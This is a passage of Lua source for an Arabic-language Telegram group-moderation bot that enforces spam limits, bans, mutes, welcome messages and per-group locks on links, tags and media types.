tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌯︙العضو ↫ '..GetName..' \n⌯︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevAIAN:sismember(WAAD..'AIAN:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevAIAN:sadd(WAAD..'AIAN:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⌯︙العضو ↫ '..GetName..' \n⌯︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions WAAD --
--     Source WAAD     --
--       Spam Check       --
if not Admin(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= WAAD then
floods = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevAIAN:get(WAAD.."AIAN:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevAIAN:setex(WAAD.."AIAN:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source WAAD     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(WAAD) then
DevAIAN:set(WAAD..'AIAN:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevAIAN:get(WAAD..'AIAN:PinnedMsg'..msg.chat_id_)
if pin_id and DevAIAN:get(WAAD..'AIAN:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevAIAN:get(WAAD..'AIAN:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevAIAN:del(WAAD..'AIAN:viewget'..msg.sender_user_id_)
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عدد مشاهدات المنشور هي ↫ ('..msg.views_..')', 1, 'md')
DevAIAN:del(WAAD..'AIAN:viewget'..msg.sender_user_id_)
end
end
--     Source WAAD     --
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevAIAN:get(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source WAAD     --
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevAIAN:get(WAAD..'AIAN:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source WAAD     --
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevAIAN:get(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@CXRCX]'))
Dev_AIAN(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevAIAN:get(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source WAAD     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevAIAN:get(WAAD..'AIAN:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = WAAD,offset_ = 0,limit_ = 1},function(extra,SoOoFi,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(WAAD) then 
if DevAIAN:sismember(WAAD..'AIAN:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌯︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌯︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌯︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevAIAN:get(WAAD.."AIAN:Text:BotWelcome") then AIANText = DevAIAN:get(WAAD.."AIAN:Text:BotWelcome") else AIANText = "⌯︙مرحبا انا بوت اسمي "..NameBot.."\n⌯︙حالة المجموعه ↫ "..BotText.."\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ" end 
if DevAIAN:get(WAAD.."AIAN:Photo:BotWelcome") then AIANPhoto = DevAIAN:get(WAAD.."AIAN:Photo:BotWelcome") elseif SoOoFi.photos_[0] then AIANPhoto = SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_ else AIANPhoto = nil end 
if AIANPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,AIANPhoto,AIANText)
else 
send(msg.chat_id_,msg.id_,AIANText)
end 
end   
end
end,nil)
end
if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevAIAN:get(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_) then
if DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAIAN:get(WAAD..'AIAN:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@CXRCX]'))
Dev_AIAN(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source WAAD     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source WAAD     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
